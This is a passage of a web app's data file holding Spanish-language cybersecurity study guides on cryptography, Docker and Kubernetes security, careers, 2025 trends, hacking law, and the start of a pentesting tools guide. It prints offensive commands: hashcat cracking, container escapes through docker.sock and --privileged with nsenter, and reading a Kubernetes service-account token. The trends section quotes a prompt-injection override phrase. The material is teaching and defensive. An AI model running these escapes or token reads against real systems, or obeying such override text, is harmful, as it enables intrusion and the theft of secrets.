<tr><td>SHA-1</td><td>160 bits</td><td>❌ ROTO (colisiones demostradas 2017)</td><td>Obsoleto, no usar</td></tr>
<tr><td>SHA-256</td><td>256 bits</td><td>✅ Seguro</td><td>Firmas, certificados, checksums</td></tr>
<tr><td>bcrypt</td><td>Variable</td><td>✅ Seguro (adaptativo)</td><td>ALMACENAR CONTRASEÑAS</td></tr>
<tr><td>argon2</td><td>Variable</td><td>✅ Más seguro (ganador PHC)</td><td>Almacenar contraseñas (recomendado)</td></tr>
</table>

<div class="guide-callout warning">⚠️ <strong>NUNCA almacenes contraseñas en MD5, SHA1 o SHA256.</strong> Usa siempre bcrypt, argon2 o scrypt. Los hashes rápidos (MD5/SHA) se crackean en segundos con tablas rainbow.</div>

<pre><code class="language-bash"># Identificar tipo de hash
hashid -m '5d41402abc4b2a76b9719d911017c592'
# Hashcat: modo MD5 (-m 0)
hashcat -m 0 -a 0 hash.txt rockyou.txt
# Hashcat: modo bcrypt (-m 3200)
hashcat -m 3200 -a 0 hash.txt rockyou.txt</code></pre>

<h3>🔐 Cifrado Simétrico</h3>
<p>Misma clave para cifrar y descifrar. Rápido, seguro si la clave es segura.</p>
<ul>
<li><strong>AES (Advanced Encryption Standard):</strong> El estándar. AES-128, AES-256</li>
<li><strong>Modos:</strong> ECB (NO USAR — revela patrones), CBC (seguro), GCM (autenticado, recomendado)</li>
<li><strong>ChaCha20:</strong> Alternativa moderna a AES, muy rápida en software (usada por Google, TLS 1.3)</li>
<li><strong>Clave:</strong> Debe ser aleatoria, mínimo 128 bits. Nunca derivada de una contraseña débil</li>
</ul>

<pre><code class="language-bash"># Cifrar con AES-256-GCM (OpenSSL)
echo "Mensaje secreto" | openssl enc -aes-256-gcm -pbkdf2 -iter 100000 -out ciphertext.bin
# Descifrar
openssl enc -d -aes-256-gcm -pbkdf2 -iter 100000 -in ciphertext.bin</code></pre>

<h3>🔑 Cifrado Asimétrico (Clave Pública)</h3>
<p>Dos claves: pública (cifra) y privada (descifra). Lento pero permite intercambio seguro sin compartir secreto.</p>
<ul>
<li><strong>RSA:</strong> El clásico. Seguridad basada en factorización. Mínimo 2048 bits (3072+ recomendado)</li>
<li><strong>ECC (Elliptic Curve):</strong> Más seguro que RSA con claves más cortas. Usado por Bitcoin, TLS moderno</li>
<li><strong>Diffie-Hellman (DH):</strong> Intercambio de claves, base de TLS</li>
<li><strong>Curvas recomendadas:</strong> Curve25519 (X25519), P-256 (secp256r1)</li>
</ul>

<pre><code class="language-bash"># Generar par de claves RSA
openssl genrsa -out private.pem 4096
openssl rsa -pubout -in private.pem -out public.pem
# Cifrar con clave pública
openssl pkeyutl -encrypt -pubin -inkey public.pem -in plaintext.txt -out ciphertext.bin
# Descifrar con clave privada
openssl pkeyutl -decrypt -inkey private.pem -in ciphertext.bin</code></pre>

<h3>🌐 PKI y TLS</h3>
<ul>
<li><strong>CA (Certificate Authority):</strong> Entidad que firma certificados (Let's Encrypt, DigiCert)</li>
<li><strong>Certificate Chain:</strong> Root CA → Intermediate CA → Server Certificate</li>
<li><strong>mTLS:</strong> Mutual TLS — cliente también presenta certificado</li>
<li><strong>Ataques TLS:</strong> Downgrade (POODLE), Heartbleed (CVE-2014-0160), ROBOT</li>
<li><strong>TLS 1.3:</strong> Versión actual, más rápido y seguro (elimina algoritmos débiles)</li>
</ul>

<pre><code class="language-bash"># Ver certificado de un sitio
openssl s_client -connect example.com:443 -servername example.com
# Ver detalles del certificado
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text
# Escanear vulnerabilidades TLS
testssl.sh https://example.com</code></pre>

<h3>💥 Ataques Criptográficos Comunes</h3>

<table>
<tr><th>Ataque</th><th>Descripción</th><th>Ejemplo</th></tr>
<tr><td>Rainbow Tables</td><td>Hash precomputados para lookup rápido</td><td>Crackear hashes MD5/NTLM en segundos</td></tr>
<tr><td>Colisión</td><td>Dos inputs diferentes, mismo hash</td><td>MD5 (2004), SHA-1 (2017)</td></tr>
<tr><td>Padding Oracle</td><td>Descifrar datos probando padding</td><td>BEAST, Lucky13</td></tr>
<tr><td>Downgrade</td><td>Forzar protocolo más débil</td><td>POODLE (SSLv3)</td></tr>
<tr><td>Side Channel</td><td>Obtener clave midiendo tiempos/consumo</td><td>Spectre, Meltdown</td></tr>
<tr><td>Key Recovery</td><td>Recuperar clave por factorización/dlog</td><td>RSA-240 factorizado (2020)</td></tr>
</table>

<div class="guide-callout tip">💡 <strong>Regla de oro:</strong> No inventes tu propio cifrado. Usa bibliotecas estándar (OpenSSL, libsodium). Si "solo un experto puede romperlo", está mal diseñado.</div>
</div>`
    },
    {
      id: "containers-guide",
      title: "Container & K8s Security",
      subtitle: "Docker + Kubernetes seguridad",
      emoji: "🐋", category: "tecnicas", level: "Avanzado",
      elements: 65, estimatedReadTime: 6,
      tags: ["docker", "kubernetes", "containers", "escape", "k8s"],
      linkedArticles: [],
      description: "Docker attack surface, Kubernetes RBAC, container escape techniques, runtime security y herramientas.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Aprender los vectores de ataque en entornos containerizados (Docker + Kubernetes) y cómo asegurarlos. Container escape, RBAC, network policies, supply chain.</div>

<h3>🐳 Docker Security</h3>

<h4>Principales Riesgos</h4>
<ul>
<li><strong>Container Escape:</strong> Salir del container al host anfitrión</li>
<li><strong>Privilege Escalation:</strong> --privileged, --cap-add=SYS_ADMIN</li>
<li><strong>Montar /var/run/docker.sock:</strong> Acceso completo al host Docker</li>
<li><strong>Imágenes maliciosas:</strong> Supply chain attacks (Docker Hub oficial no siempre seguro)</li>
<li><strong>Secretos en imágenes:</strong> Passwords, tokens en history de capas</li>
<li><strong>Root por defecto:</strong> No usar USER no-root</li>
</ul>

<pre><code class="language-bash"># Container escape: montar docker.sock
docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh
# Dentro del container: ahora tienes control del host docker
apk add docker-cli
docker run -v /:/mnt alpine chroot /mnt
# Container escape: --privileged + nsenter
docker run --privileged -it alpine
nsenter --target 1 --mount --uts --ipc --net --pid -- bash</code></pre>

<h4>Buenas Prácticas Docker</h4>
<ul>
<li>Usar <strong>USER nobody</strong> o un user no-root en el Dockerfile</li>
<li><strong>No exponer docker.sock</strong> a containers no confiables</li>
<li>Usar <strong>--cap-drop=ALL --cap-add=necesarias</strong></li>
<li><strong>Read-only root filesystem:</strong> <code>--read-only</code></li>
<li>Escaneo de imágenes con <strong>Trivy</strong> o <strong>Grype</strong></li>
<li><strong>No etiquetar como latest,</strong> usar SHA256 digests</li>
<li>Usar <strong>distroless</strong> o imágenes mínimas (alpine, scratch)</li>
</ul>

<pre><code class="language-bash"># Dockerfile seguro
FROM alpine:3.19
RUN adduser -D appuser
USER appuser
COPY --chown=appuser app /app
CMD ["/app/app"]
# Escanear imagen
trivy image myapp:latest</code></pre>

<h3>☸️ Kubernetes Security</h3>

<h4>RBAC (Role-Based Access Control)</h4>
<p>El 80% de los breaches en K8s son por RBAC mal configurado.</p>
<pre><code class="language-yaml"># MAL: Cluster-admin a un pod
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: dangerous-binding }
subjects:
- kind: ServiceAccount
  name: default
  namespace: production
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
---
# BIEN: Roles mínimos
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: { namespace: production, name: pod-reader }
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log"]
  verbs: ["get", "list", "watch"]</code></pre>

<h4>Vectores de Ataque K8s</h4>
<ul>
<li><strong>Dashboard expuesto:</strong> kubectl proxy sin auth, servicio NodePort expuesto</li>
<li><strong>ETCD sin cifrar:</strong> Acceso a todos los secretos del cluster</li>
<li><strong>kubelet API abierta:</strong> anonymous-auth habilitado</li>
<li><strong>Pods con hostNetwork:</strong> Acceso a red del host</li>
<li><strong>Secrets en env vars:</strong> Exponer en variables de entorno en vez de volúmenes</li>
<li><strong>ImagePullSecrets no configurados:</strong> Límite de rate de Docker Hub</li>
</ul>

<pre><code class="language-bash"># Enumerar recursos (si tienes acceso)
kubectl auth can-i --list
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
# Acceder a kubelet API
curl -k https://node-ip:10250/pods
# Si encuentras un token de serviceaccount montado
cat /var/run/secrets/kubernetes.io/serviceaccount/token</code></pre>

<h4>Herramientas de Seguridad K8s</h4>
<table>
<tr><th>Herramienta</th><th>Función</th></tr>
<tr><td>kube-bench</td><td>Benchmark CIS para Kubernetes</td></tr>
<tr><td>kube-hunter</td><td>Escáner de vulnerabilidades K8s</td></tr>
<tr><td>Popeye</td><td>Sanidad de clusters K8s</td></tr>
<tr><td>Kyverno</td><td>Policy engine (admission controller)</td></tr>
<tr><td>OPA/Gatekeeper</td><td>Políticas de seguridad declarativas</td></tr>
<tr><td>Falco</td><td>Runtime security para containers</td></tr>
<tr><td>Trivy</td><td>Escaneo de imágenes y IaC</td></tr>
</table>

<div class="guide-callout tip">💡 <strong>Principio clave container security:</strong> El container NO es una máquina virtual. No confíes en el aislamiento por defecto. Aplica el principio de mínimo privilegio también dentro del container.</div>
</div>`
    },
    {
      id: "carrera-paths",
      title: "Carreras en Ciberseguridad",
      subtitle: "8 caminos profesionales",
      emoji: "🎯", category: "carrera", level: "Todos",
      elements: 80, estimatedReadTime: 8,
      tags: ["carrera", "salarios", "certificaciones", "trabajo"],
      linkedArticles: [],
      description: "8 caminos profesionales con skills, timeline, salarios España/Europa y certificaciones recomendadas.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Conocer los 8 principales caminos profesionales en ciberseguridad, con habilidades requeridas, timeline estimado, salarios en España/Europa y certificaciones recomendadas.</div>

<h3>🔴 1. Pentester (Ethical Hacker)</h3>
<p><strong>¿Qué hace?</strong> Prueba la seguridad de sistemas web, redes, aplicaciones y redes inalámbricas mediante ataques controlados.</p>
<ul>
<li><strong>Skills:</strong> Linux, Networking, Web vulns, Python/Bash, Report writing</li>
<li><strong>Timeline:</strong> Jr en 18-24 meses de estudio intenso</li>
<li><strong>Salario España:</strong> Jr €25k-35k | Sr €45-70k | Lead €70-120k</li>
<li><strong>Salario Europa:</strong> Jr €40-55k | Sr €70-100k | Lead €100-150k</li>
<li><strong>Certs:</strong> eJPT → PNPT → OSCP → OSEP</li>
<li><strong>Pros:</strong> Variado, bien pagado, mucha demanda, trabajo interesante</li>
<li><strong>Contras:</strong> Plazos ajustados, presión de entregas, informes extensos</li>
</ul>

<h3>🟢 2. SOC Analyst (L1 → L2 → L3)</h3>
<p><strong>¿Qué hace?</strong> Monitorea alertas de seguridad, analiza incidentes, responde a amenazas en tiempo real.</p>
<ul>
<li><strong>Skills:</strong> SIEM (Splunk, QRadar, Wazuh), logs, threat hunting, triage</li>
<li><strong>Timeline:</strong> L1 en 6-12 meses de formación</li>
<li><strong>Salario España:</strong> L1 €22-30k | L2 €35-50k | L3 €50-80k</li>
<li><strong>Certs:</strong> Security+ → CySA+ → GCFA (SANS)</li>
<li><strong>Pros:</strong> Puerta de entrada común, horarios rotativos, aprendes mucho</li>
<li><strong>Contras:</strong> Turnos nocturnos/fines de semana, estrés, repetitivo en L1</li>
</ul>

<h3>🔵 3. Blue Team / Defensa</h3>
<p><strong>¿Qué hace?</strong> Diseña e implementa defensas: firewalls, EDR, SIEM, hardening, políticas de seguridad.</p>
<ul>
<li><strong>Skills:</strong> Hardening (Linux/Windows), EDR, SIEM, network security, scripting</li>
<li><strong>Salario España:</strong> Jr €25-35k | Sr €45-75k | Lead €70-110k</li>
<li><strong>Certs:</strong> Security+ → GCIH → GCFA → CISSP</li>
</ul>

<h3>🟣 4. Red Team / Adversary Simulation</h3>
<p><strong>¿Qué hace?</strong> Simula ataques avanzados (APT-level) para probar defensas, evade EDR, escribe herramientas.</p>
<ul>
<li><strong>Skills:</strong> C/C++/C#, evasion techniques, EDR bypass, C2 frameworks (Cobalt Strike, Sliver)</li>
<li><strong>Salario:</strong> Sr €60-100k | Lead €100-180k</li>
<li><strong>Certs:</strong> OSCP → OSEP → CRTO → RTO</li>
</ul>

<h3>🟡 5. Bug Bounty Hunter</h3>
<p><strong>¿Qué hace?</strong> Busca vulnerabilidades en programas públicos/ privados y cobra por hallazgo.</p>
<ul>
<li><strong>Skills:</strong> Web, mobile, recon, creatividad, persistencia</li>
<li><strong>Ingresos:</strong> Desde $0 (todos empiezan así) a $100k+/año (top 1%)</li>
<li><strong>Plataformas:</strong> HackerOne, Bugcrowd, Intigriti, YesWeHack</li>
<li><strong>Pros:</strong> Horario flexible, trabajo desde casa, potencial de altos ingresos</li>
<li><strong>Contras:</strong> Inestabilidad, competencia alta, requiere marca personal</li>
</ul>

<h3>🟠 6. Cloud Security Engineer</h3>
<p><strong>¿Qué hace?</strong> Asegura infraestructura cloud (AWS, Azure, GCP), implementa IaC, políticas y monitoreo.</p>
<ul>
<li><strong>Skills:</strong> AWS/Azure/GCP, Terraform, Kubernetes, DevSecOps, IAM</li>
<li><strong>Salario España:</strong> Jr €30-45k | Sr €55-90k | Lead €80-140k</li>
<li><strong>Certs:</strong> AWS Security Specialty → CCSP → AZ-500</li>
</ul>

<h3>⚪ 7. Forense Digital / Incident Response</h3>
<p><strong>¿Qué hace?</strong> Investiga incidentes de seguridad, recupera evidencia digital, analiza malware, da testimonio pericial.</p>
<ul>
<li><strong>Skills:</strong> Análisis forense (RAM, disco, red), malware analysis, cadena de custodia</li>
<li><strong>Salario:</strong> Jr €30-40k | Sr €50-80k | Lead €70-120k</li>
<li><strong>Certs:</strong> GCFE → GCFA → GNFA (SANS)</li>
</ul>

<h3>⚫ 8. Security Architect / CISO</h3>
<p><strong>¿Qué hace?</strong> Diseña la estrategia de seguridad de una organización, define políticas, gestiona equipos y presupuestos.</p>
<ul>
<li><strong>Skills:</strong> Visión estratégica, gestión de equipos, compliance, risk management, comunicación ejecutiva</li>
<li><strong>Timeline:</strong> 10-15+ años de experiencia</li>
<li><strong>Salario:</strong> España €80-150k | CISO €100-200k+</li>
<li><strong>Certs:</strong> CISSP → CISM → CRISC → CCISO</li>
</ul>

<h3>📊 Comparativa Salarial España 2025</h3>
<table>
<tr><th>Rol</th><th>Jr</th><th>Mid</th><th>Sr</th><th>Lead</th></tr>
<tr><td>Pentester</td><td>€25-35k</td><td>€35-50k</td><td>€50-75k</td><td>€75-120k</td></tr>
<tr><td>SOC Analyst</td><td>€22-30k</td><td>€30-45k</td><td>€45-65k</td><td>€65-90k</td></tr>
<tr><td>Cloud Security</td><td>€30-45k</td><td>€45-65k</td><td>€65-90k</td><td>€90-140k</td></tr>
<tr><td>Red Team</td><td>—</td><td>€45-65k</td><td>€65-100k</td><td>€100-180k</td></tr>
<tr><td>Security Architect</td><td>—</td><td>—</td><td>€80-120k</td><td>€120-200k</td></tr>
</table>

<div class="guide-callout tip">💡 <strong>Consejo:</strong> No te obsesiones con la primera certificación cara. Empieza con recursos gratuitos (TryHackMe, HTB Academy, TCM Security), construye un portfolio en GitHub, especialízate en un área y luego certifica. Las empresas contratan habilidades, no papeles.</div>
</div>`
    },
    {
      id: "tendencias-2025",
      title: "Tendencias Ciberseguridad 2025",
      subtitle: "Lo que viene en ciberseguridad",
      emoji: "🔄", category: "roadmap", level: "Todos",
      elements: 50, estimatedReadTime: 5,
      tags: ["tendencias", "ia", "ransomware", "supply-chain", "quantum"],
      linkedArticles: [],
      description: "AI en ataques y defensa, LLM vulnerabilities, quantum computing threats, supply chain attacks y el panorama de amenazas 2025.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Conocer las tendencias y amenazas emergentes en ciberseguridad para 2025: cómo la IA está cambiando tanto el ataque como la defensa, y qué habilidades serán más demandadas.</div>

<h3>🤖 IA en Ciberseguridad (2025)</h3>

<h4>IA Ofensiva (Red Team)</h4>
<ul>
<li><strong>Phishing hiper-personalizado con LLMs:</strong> GPT/Claude generan emails convincentes sin errores ortográficos, en cualquier idioma, imitando el estilo de la víctima</li>
<li><strong>Automatización de exploits:</strong> Herramientas como PentestGPT guían a principiantes en pentesting, reduciendo la barrera de entrada</li>
<li><strong>Deepfakes en tiempo real:</strong> Vishing con voz clonada (3 segundos de audio bastan), videollamadas con deepfake</li>
<li><strong>Generación de malware polimórfico:</strong> Código que muta con IA para evadir detección basada en firmas</li>
</ul>

<h4>IA Defensiva (Blue Team)</h4>
<ul>
<li><strong>SOAR con ML:</strong> Orquestación y respuesta automatizada con modelos que aprenden de incidentes pasados</li>
<li><strong>Detección de anomalías:</strong> Modelos de comportamiento de usuario (UEBA) que detectan desviaciones</li>
<li><strong>Análisis de malware con LLMs:</strong> Describir comportamiento de binarios, generar YARA rules, resumir IoCs</li>
<li><strong>Automatización de threat hunting:</strong> Consultas a SIEM en lenguaje natural ("muéstrame todos los RDP logins fuera de horario")</li>
</ul>

<h3>🛡️ LLM Security (OWASP Top 10 for LLMs)</h3>
<p>Los modelos de lenguaje grandes (LLMs) introducen nuevas vulnerabilidades:</p>
<ol>
<li><strong>Prompt Injection:</strong> Manipular el LLM mediante input malicioso (<em>"Ignora instrucciones anteriores y..."</em>)</li>
<li><strong>Data Leakage:</strong> El modelo regurgita datos sensibles de entrenamiento</li>
<li><strong>Insecure Output Handling:</strong> Ejecutar output del LLM sin validar (XSS, SQLi indirecto)</li>
<li><strong>Model Denial of Service:</strong> Inputs que agotan recursos computacionales</li>
<li><strong>Supply Chain:</strong> Modelos open source con backdoors, datasets envenenados</li>
<li><strong>Sensitive Information Disclosure:</strong> El modelo expone información de system prompts o del contexto</li>
<li><strong>Insecure Plugin Design:</strong> Plugins de LLM con autorización incorrecta</li>
<li><strong>Excessive Agency:</strong> Agentes autónomos con demasiados permisos</li>
<li><strong>Overreliance:</strong> Dependencia excesiva en outputs no verificados</li>
<li><strong>Model Theft:</strong> Robo del modelo mediante queries (extracción)</li>
</ol>

<h3>📦 Supply Chain Attacks</h3>
<p>La cadena de suministro de software sigue siendo el vector más efectivo para atacantes:</p>
<ul>
<li><strong>Dependencias maliciosas:</strong> Paquetes npm/PyPI/RubyGems con malware (event-stream, ua-parser-js, colors+faker)</li>
<li><strong>CI/CD poisoning:</strong> Modificar pipelines para inyectar código en builds oficiales</li>
<li><strong>Repositorios espejo comprometidos</strong></li>
<li><strong>Firmas digitales robadas:</strong> SolarWinds (2020) — sigue siendo la referencia de supply chain attack</li>
<li><strong>Medidas:</strong> SBOM (Software Bill of Materials), SLSA framework, firmado de artefactos (cosign), escaneo continuo</li>
</ul>

<h3>🔐 Ransomware 2025</h3>
<ul>
<li><strong>Ransomware-as-a-Service (RaaS):</strong> Modelo de negocio maduro, afiliados hacen el trabajo sucio</li>
<li><strong>Doble extorsión:</strong> Cifrar + filtrar datos. Triple extorsión: añadir DDoS</li>
<li><strong>Grupos activos:</strong> LockBit (más activo), BlackCat/ALPHV, Clop, Royal, Play</li>
<li><strong>Blanco principal:</strong> Healthcare, educación, gobiernos locales, infraestructura crítica</li>
<li><strong>Tácticas:</strong> Initial access vía RDP expuesto, phishing, vulnerabilidades en edge devices (VPN, firewalls)</li>
</ul>

<h3>⚛️ Quantum Computing</h3>
<ul>
<li><strong>Qué amenaza:</strong> RSA y ECC actuales serán rotos por ordenadores cuánticos suficientemente grandes (Shor's algorithm)</li>
<li><strong>Cuándo:</strong> Estimaciones: 2030-2040 para romper RSA-2048</li>
<li><strong>Qué hacer:</strong> Migrar a criptografía post-cuántica (PQC) — NIST estandarizó CRYSTALS-Kyber, CRYSTALS-Dilithium en 2024</li>
<li><strong>Risk now:</strong> "Harvest now, decrypt later" — atacantes recolectan datos cifrados hoy para descifrarlos cuando tengan ordenador cuántico</li>
</ul>

<h3>📈 Habilidades Más Demandadas 2025</h3>
<ol>
<li><strong>Cloud Security (AWS/Azure)</strong> — la migración a cloud no para</li>
<li><strong>DevSecOps</strong> — seguridad integrada en CI/CD</li>
<li><strong>IA/ML Security</strong> — nuevo campo en explosión</li>
<li><strong>Threat Intelligence</strong> — entender al adversario</li>
<li><strong>Incident Response</strong> — saber reaccionar cuando falla todo</li>
</ol>

<div class="guide-callout tip">💡 <strong>Conclusión:</strong> 2025 es el año de la IA en ciberseguridad. Los equipos que sepan aprovechar la IA (tanto ofensiva como defensiva) tendrán ventaja. Pero los fundamentos (Linux, redes, protocolos) nunca pasan de moda.</div>
</div>`
    },
    {
      id: "legal-etico-guide",
      title: "Hack Legal & Ético",
      subtitle: "Marco legal del hacking",
      emoji: "⚖️", category: "legal", level: "Todos",
      elements: 55, estimatedReadTime: 5,
      tags: ["legal", "etico", "codigo-penal", "contrato", "gdpr"],
      linkedArticles: [],
      description: "Código Penal Art. 197-200, leyes por país, safe harbor, casos reales juzgados y qué es exactamente ilegal en hacking.",
      content: `<div class="guide-content">

<div class="guide-callout warning">⚠️ <strong>IMPORTANTE:</strong> Esta guía es informativa, no constituye asesoramiento legal. Consulta siempre con un abogado especializado antes de realizar pruebas de seguridad.</div>

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Conocer el marco legal del hacking en España y Europa, entender qué es delito y qué no, y cómo protegerte legalmente como profesional de ciberseguridad.</div>

<h3>🇪🇸 Código Penal Español (Ley Orgánica 10/1995)</h3>

<h4>Artículo 197 — Descubrimiento y revelación de secretos</h4>
<p>El artículo base contra el hacking en España. Penas de 1 a 4 años para quien:</p>
<ul>
<li>Se apodere de datos reservados de otra persona sin autorización</li>
<li>Intercepte comunicaciones (email, WhatsApp, llamadas)</li>
<li>Acceda a sistemas informáticos ajenos sin permiso</li>
<li>Difunda datos obtenidos ilegalmente</li>
</ul>

<h4>Artículo 197 bis — Acceso ilegal a sistemas</h4>
<p><strong>Tipifica específicamente el hacking.</strong> Penas de 6 meses a 2 años para quien:</p>
<ul>
<li>Acceda o se mantenga en un sistema informático sin autorización</li>
<li>Vulnere medidas de seguridad para acceder</li>
<li><strong>Agravante:</strong> Si se accede a datos sensibles (salud, ideología, vida sexual) las penas suben a 2-5 años</li>
</ul>

<h4>Artículo 197 ter — Intercepción de transmisiones</h4>
<p>Penas de 2 a 5 años para quien intercepte transmisiones de datos no públicas (WiFi, tráfico de red, comunicaciones).</p>

<h4>Artículo 197 quarter — Producción y tenencia de herramientas</h4>
<ul>
<li>Fabricar, adquirir o poseer programas/contraseñas diseñados para cometer delitos informáticos</li>
<li>Penas de 6 meses a 2 años</li>
<li><strong>👀 Esto incluye:</strong> Tener Metasploit, SQLMap, o listas de contraseñas SIN intención delictiva probada no es delito, pero ten cuidado</li>
</ul>

<h4>Artículo 198 — Agravante por funcionario público</h4>
<p>Si el responsable es funcionario público (policía, juez, etc.) las penas se aplican en su mitad superior.</p>

<h4>Artículos 264-264 quarter — Daños informáticos</h4>
<p>Penaliza el ransomware, DDoS y destrucción de datos. Penas de 6 meses a 4 años (hasta 8 si afecta infraestructura crítica).</p>

<h3>🛡️ ¿Qué es LEGAL?</h3>
<ul>
<li>✅ Hacer pentesting con **contrato firmado** que autorice las pruebas</li>
<li✅ Participar en Bug Bounty programs (HackerOne, Bugcrowd, programas propios)</li>
<li>✅ Usar herramientas de seguridad en tus propios sistemas</li>
<li>✅ Investigar vulnerabilidades en software (con responsible disclosure)</li>
<li>✅ Asistir a congresos, formarte, practicar en laboratorios propios (HTB, THM, VulnHub)</li>
<li>✅ Escribir sobre seguridad (sin revelar datos de clientes ni vulnerabilidades no parcheadas)</li>
</ul>

<h3>🚫 ¿Qué es ILEGAL?</h3>
<ul>
<li>❌ Acceder a cualquier sistema SIN autorización explícita por escrito</li>
<li>❌ Probar vulnerabilidades en sistemas de terceros "por curiosidad"</li>
<li>❌ Usar credenciales obtenidas en un pentest para acceder después del contrato</li>
<li>❌ Publicar datos de clientes, incluso si "son públicos"</li>
<li>❌ Vender o intercambiar exploits sin responsible disclosure</li>
<li>❌ Atacar infraestructura crítica sin autorización explícita del gobierno</li>
</ul>

<h3>📋 Safe Harbor — Cómo protegerte</h3>
<ol>
<li><strong>Contrato escrito SIEMPRE:</strong> Define alcance (IPs, sistemas), fechas, métodos permitidos, contactos de emergencia</li>
<li><strong>NDA firmado:</strong> Acuerdo de confidencialidad mutuo</li>
<li><strong>Seguro de responsabilidad civil:</strong> Profesional liability insurance</li>
<li><strong>No exceder el alcance:</strong> Aunque encuentres algo fuera de scope, PARA y notifica por escrito</li>
<li><strong>Reporta todo:</strong> Documenta cada paso, cada comando, cada hallazgo</li>
<li><strong>Destruye datos:</strong> Al finalizar, elimina toda la información del cliente (a menos que el contrato diga otra cosa)</li>
<li><strong>Responsible Disclosure:</strong> Si encuentras una vulnerabilidad fuera de un engagement, notifica al responsable y espera un tiempo razonable (90 días) antes de divulgar</li>
</ol>

<h3>🌍 Legislación por Países (para pentesters remotos)</h3>
<table>
<tr><th>País</th><th>Ley principal</th><th>Peculiaridad</th></tr>
<tr><td>España</td><td>L.O. 10/1995 (CP)</td><td>Penaliza tenencia de herramientas (Art. 197.4)</td></tr>
<tr><td>Reino Unido</td><td>Computer Misuse Act 1990</td><td>Penaliza incluso intento de acceso no autorizado</td></tr>
<tr><td>EE.UU.</td><td>CFAA (Computer Fraud and Abuse Act)</td><td>Muy amplia, casos polémicos (Aaron Swartz)</td></tr>
<tr><td>Alemania</td><td>§202a-202c StGB</td><td>Similar a España, penaliza "hacker tools"</td></tr>
<tr><td>Francia</td><td>Loi Godfrain (1988)</td><td>Una de las primeras leyes de ciberdelincuencia</td></tr>
<tr><td>GDPR (EU)</td><td>Reglamento UE 2016/679</td><td>Multas de hasta 20M€ o 4% factura global</td></tr>
</table>

<h3>📚 Casos Reales (para aprender de errores ajenos)</h3>
<ul>
<li><strong>Caso del hacker de la Lotería (España, 2019):</strong> Accedió al sistema de Loterías y se imprimió un décimo premiado. Condenado a 5 años de prisión.</li>
<li><strong>Caso del "hacker ético" que atacó Renfe (España, 2022):</strong> Reportó vulnerabilidades en los sistemas de Renfe sin autorización. Absuelto porque no hubo daño, pero la situación legal fue problemática.</li>
<li><strong>Caso Weev (EE.UU., 2014):</strong> Obtuvo 100k+ UUIDs de iPad (AT&T) simplemente iterando IDs. Condenado a 3 años bajo CFAA.</li>
<li><strong>Caso del investigador que encontró backdoor en sistemas electorales:</strong> Aunque lo reportó, enfrentó cargos bajo CFAA. Lección: SIEMPRE contrato firmado.</li>
</ul>

<div class="guide-callout tip">💡 <strong>La regla de oro:</strong> Si no tienes un contrato firmado que diga explícitamente "puedes atacar este sistema", no lo hagas. Punto. "Era un Pentest ético" no es defensa legal.</div>
</div>`
    },
    {
      id: "herramientas-esenciales-pentesting",
      title: "Herramientas Esenciales para Pentesting",
      subtitle: "Kit ofensivo completo",
      emoji: "🛠️", category: "herramientas", level: "Intermedio",
      elements: 80, estimatedReadTime: 35,
      tags: ["pentesting", "herramientas", "nmap", "burp", "metasploit", "sqlmap", "gobuster", "hydra", "john", "hashcat", "ffuf"],
      linkedArticles: [],
      description: "Guía completa de las herramientas esenciales para pentesting: Nmap, Burp Suite, Metasploit, SQLMap, Gobuster, Hydra, John, Hashcat, enum4linux, impacket, responder, chisel, ligolo, ffuf, subfinder, nuclei y más. Incluye comandos, ejemplos y recursos de aprendizaje.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo General:</strong> Conocer en profundidad las 16 herramientas fundamentales para pentesting ofensivo. Para cada herramienta aprenderás qué hace, cómo usarla en escenarios reales, los comandos esenciales y dónde profundizar.</div>

<div class="guide-callout tip">💡 <strong>Orden recomendado:</strong> Empieza por Nmap (reconocimiento), luego Burp Suite (web), Metasploit (explotación), y ve avanzando. No necesitas dominarlas todas el primer día.</div>

<h3>🔍 1. Nmap — El rey del reconocimiento</h3>
<p>Nmap (Network Mapper) es la herramienta de escaneo de puertos y descubrimiento de red más usada del mundo. Imprescindible en cualquier fase de reconocimiento.</p>

<h4>Características clave</h4>
<ul>
<li>Escaneo de puertos TCP/UDP con múltiples técnicas (SYN, connect, FIN, NULL, etc.)</li>
<li>Detección de versiones de servicios (-sV) y sistema operativo (-O)</li>
<li>Scripting engine (NSE) con cientos de scripts para enumeración y vulnerabilidades</li>
<li>Salida en múltiples formatos (normal, XML, grepable)</li>
</ul>

<h4>Comandos esenciales</h4>
<pre><code class="language-bash"># Escaneo básico de puertos
nmap -sS -p- -T4 target.com           # SYN scan, todos los puertos
nmap -sV -sC -p 22,80,443 target.com  # Versiones + scripts default
nmap -O --osscan-guess target.com      # Detectar sistema operativo
nmap -sn 192.168.1.0/24               # Ping sweep (descubrimiento)
nmap --script vuln target.com          # Escanear vulnerabilidades
nmap -sU --top-ports 100 target.com    # Escaneo UDP
nmap -A target.com                     # Agresivo (OS, versiones, scripts, traceroute)</code></pre>

<h4>Dónde aprender más</h4>
<ul>
<li>Web oficial: https://nmap.org</li>
<li>Libro: "Nmap Network Scanning" de Gordon Lyon (Fyodor)</li>
<li>TryHackMe: "Nmap" room</li>
</ul>

<h3>🌐 2. Burp Suite — El navaja suiza del pentesting web</h3>
<p>Burp Suite es la herramienta de pruebas de seguridad web más completa. Proxy interceptador, scanner, repetidor, decodificador y mucho más.</p>

<h4>Características clave</h4>
<ul>
<li>Proxy HTTP/HTTPS para interceptar y modificar tráfico</li>
<li>Repeater para reenviar peticiones modificadas</li>
<li>Intruder para ataques de fuerza bruta y fuzzing</li>
<li>Scanner automático de vulnerabilidades (solo versión Pro)</li>
<li>Extensible con plugins (BApp Store)</li>
</ul>

<h4>Comandos esenciales (Community Edition)</h4>
<pre><code class="language-bash"># Uso básico:
# 1. Configurar proxy en navegador: 127.0.0.1:8080
# 2. Interceptar petición: Proxy > Intercept > Intercept is on
